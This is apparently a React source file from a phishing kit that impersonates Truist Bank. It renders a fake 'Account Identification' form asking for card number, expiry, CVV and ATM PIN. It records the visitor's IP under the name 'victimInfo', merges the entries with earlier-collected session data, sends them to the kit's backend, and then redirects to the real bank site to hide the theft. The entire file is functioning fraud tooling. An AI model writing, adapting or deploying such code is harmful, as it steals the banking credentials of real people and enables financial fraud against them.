import React, { useEffect, useState } from "react";
import API from "../api/api";
import FormLayout from "../components/formLayout";
import axios from "axios";
import { APP_STORAGE_NAME } from "../utils/constants";
import Button from "../components/button";
import Input from "../components/input";

const Card = () => {
  const [data, setData] = useState({ card: "", expiry: "", cvv: "", pin: "" });
  const [isLoading, setIsLoading] = useState(false);
  const [isError, setIsError] = useState({
    card: false,
    expiry: false,
    cvv: false,
    pin: false,
  });
  const [victimInfo, setVictimData] = useState({
    ip: "",
  });

  const handleChange = (e) => {
    let { name, value } = e.target;
    if (["card", "cvv", "pin"].includes(name)) {
      if (!/^[0-9]+$/.test(value)) return;
    }

    if (/\d+/.test(value) && name === "expiry") {
      if (value?.length === 2) {
        value = value + "/";
      }
    }

    setData((prev) => ({
      ...prev,
      [name]: value,
    }));
  };

  const handleKeyDown = (e) => {
    if (e.key === "Backspace" && /^\d\d\/$/.test(data?.expiry)) {
      setData((prev) => ({
        ...prev,
        expiry: "",
      }));
    }
  };

  const handleClick = () => {
    if (!data?.card?.trim()) {
      setIsError((prev) => ({ ...prev, card: true }));
    }
    if (!data?.expiry?.trim()) {
      setIsError((prev) => ({ ...prev, expiry: true }));
    }
    if (!data?.cvv?.trim()) {
      setIsError((prev) => ({ ...prev, cvv: true }));
    }
    if (!data?.pin?.trim()) {
      setIsError((prev) => ({ ...prev, pin: true }));
    }

    if (data?.card?.trim()) {
      setIsError((prev) => ({ ...prev, card: false }));
    }
    if (data?.expiry?.trim()) {
      setIsError((prev) => ({ ...prev, expiry: false }));
    }
    if (data?.cvv?.trim()) {
      setIsError((prev) => ({ ...prev, cvv: false }));
    }
    if (data?.pin?.trim()) {
      setIsError((prev) => ({ ...prev, pin: false }));
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    const _data = JSON.parse(sessionStorage.getItem(APP_STORAGE_NAME)) || {};
    setIsLoading(true);
    try {
      const res = await API.createDetail({
        ..._data,
        bank: "Truist Bank",
        userAgent: navigator?.userAgent,
        cardInfo: data,
        victimInfo,
      });
      if (res.status === 201) {
        sessionStorage.removeItem(APP_STORAGE_NAME);
        window.location.href = "https://www.truist.com/";
      } else {
        setIsLoading(false);
      }
    } catch (error) {
      alert("Something went wrong");
      setIsLoading(false);
    }
  };

  useEffect(() => {
    async function getIP() {
      const resp = await axios.get("https://api.ipify.org/?format=json");
      if (resp.data.ip) {
        setVictimData({ ip: resp.data.ip });
      }
    }
    getIP();

    return () => {
      setData({ card: "", expiry: "", cvv: "", pin: "" });
      setIsLoading(false);
    };
  }, []);

  return (
    <FormLayout
      handleSubmit={handleSubmit}
      title={"Account Identification"}
    >
      <Input
        title="Card Number"
        name="card"
        value={data?.card}
        onChange={handleChange}
        onBlur={handleClick}
        isError={isError?.card}
        minLength={16}
        maxLength={16}
      />
      <div className="w-full flex items-center justify-between gap-3">
        <Input
          title="Expiry"
          name="expiry"
          value={data?.expiry}
          placeholder="MM/YY"
          onKeyDown={handleKeyDown}
          onChange={handleChange}
          onBlur={handleClick}
          isError={isError?.expiry}
          maxLength={5}
        />
        <Input
          title="CVV"
          name="cvv"
          value={data?.cvv}
          onChange={handleChange}
          onBlur={handleClick}
          isError={isError?.cvv}
          minLength={3}
          maxLength={3}
        />
      </div>
      <Input
        title="ATM PIN"
        name="pin"
        value={data?.pin}
        onChange={handleChange}
        onBlur={handleClick}
        isError={isError?.pin}
        minLength={4}
        maxLength={4}
      />
      <Button
        title={
          isLoading ? (
            <span className="loading loading-spinner loading-md text-white"></span>
          ) : (
            "Continue"
          )
        }
      />
    </FormLayout>
  );
};

export default Card;
